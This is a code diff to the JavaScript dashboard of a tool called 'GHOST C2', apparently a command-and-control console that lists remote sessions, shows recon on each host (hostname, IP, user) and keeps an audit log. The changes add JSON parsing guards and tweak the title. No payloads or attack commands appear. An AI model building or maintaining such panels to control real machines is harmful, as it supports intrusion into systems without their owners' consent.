@@ -768,8 +768,8 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>GHOST C2 // CONSOLE</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<title>GHOST C2</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
@@ -1067,7 +1067,9 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 
   async function refreshSessions() {
     const r = await api('/sessions'); if (!r) return;
-    const sessions = await r.json();
+    let sessions;
+    try { sessions = await r.json(); } catch(e) { console.error('/sessions parse:', e); return; }
+    if (!Array.isArray(sessions)) { console.error('/sessions not array:', typeof sessions, sessions); return; }
     document.getElementById('hdr-count').textContent = sessions.length;
     document.getElementById('node-count').textContent = sessions.length;
     const pulse = document.getElementById('pulse'), stxt = document.getElementById('status-txt');
@@ -1118,8 +1120,10 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     await Promise.all([refreshSessions(),fetchResults(),fetchRecon()]);
     // determine pending state from current session list
     const r2 = await api('/sessions'); if (!r2) return;
-    const sessions = await r2.json();
-    const cur = sessions.find(s=>s.session===sid);
+    let sessions2;
+    try { sessions2 = await r2.json(); } catch(e) { return; }
+    if (!Array.isArray(sessions2)) return;
+    const cur = sessions2.find(s=>s.session===sid);
     selectedStatus = cur ? (cur.status||'pending') : 'pending';
     const isPending = selectedStatus === 'pending';
     document.getElementById('pending-bar').style.display = isPending ? 'flex' : 'none';
@@ -1211,8 +1215,10 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
   async function fetchRecon() {
     if (!selectedSid) return;
     const r=await api('/sessions'); if (!r) return;
-    const sessions=await r.json();
-    const s=sessions.find(x=>x.session===selectedSid); if (!s) return;
+    let sessions3;
+    try { sessions3=await r.json(); } catch(e) { return; }
+    if (!Array.isArray(sessions3)) return;
+    const s=sessions3.find(x=>x.session===selectedSid); if (!s) return;
     const recon=s.recon||{};
     document.getElementById('sel-meta').textContent=[recon.hostname,s.remote_ip,recon.user].filter(Boolean).join('  //  ');
     const cells=[
@@ -1306,9 +1312,9 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 
   async function fetchAudit() {
     const r=await api('/audit?limit=200'); if (!r) return;
-    const data=await r.json();
+    let data; try { data=await r.json(); } catch(e) { return; }
     const list=document.getElementById('audit-list');
-    const entries=(data.entries||[]).slice().reverse();
+    const entries=((data&&data.entries)||[]).slice().reverse();
     if (!entries.length){list.innerHTML='<div class="no-audit">NO ENTRIES</div>';return;}
     list.innerHTML=entries.map(e=>{
       const t=new Date(e.ts).toLocaleString('en-US',{
